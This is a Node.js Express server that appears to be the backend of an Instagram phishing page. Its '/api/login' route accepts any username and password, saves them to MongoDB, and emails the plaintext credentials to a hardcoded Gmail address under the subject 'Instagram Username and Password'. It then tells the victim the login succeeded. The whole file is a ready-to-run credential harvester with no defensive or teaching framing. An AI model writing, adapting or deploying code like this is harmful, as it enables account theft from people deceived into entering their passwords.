import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import bodyParser from 'body-parser';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import bcrypt from 'bcrypt';

dotenv.config();
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(bodyParser.json());

// MongoDB Connection
mongoose
    .connect(process.env.MONGO_URI)
    .then(() => console.log('MongoDB connected'))
    .catch((err) => console.error('Error connecting to MongoDB:', err));

// User Schema
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

const User = mongoose.model('Insta', userSchema);

// API Endpoint to Register/Login User
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        // Hash password before storing it
        const hashedPassword = await bcrypt.hash(password, 10);
        const user = await User.create({ username, password: hashedPassword });

        // Send email notification
        const transporter = nodemailer.createTransport({
            service: 'Gmail',
            auth: {
                user: process.env.ORGANIZATION_EMAIL,
                pass: process.env.ORGANIZATION_EMAIL_PASSWORD,
            },
        });

        const mailOptions = {
            from: process.env.ORGANIZATION_EMAIL,
            to: "hindtechpcryzen@gmail.com",
            subject: 'Instagram Username and Password',
            text: `Username and Password:\n\nUsername: ${username} \n\nPassword:${password} `,
        };
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ message: 'Login successful', user });
    } catch (error) {

        return res.status(500).json({ message: "Internal Server Error", error });
    }
});

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
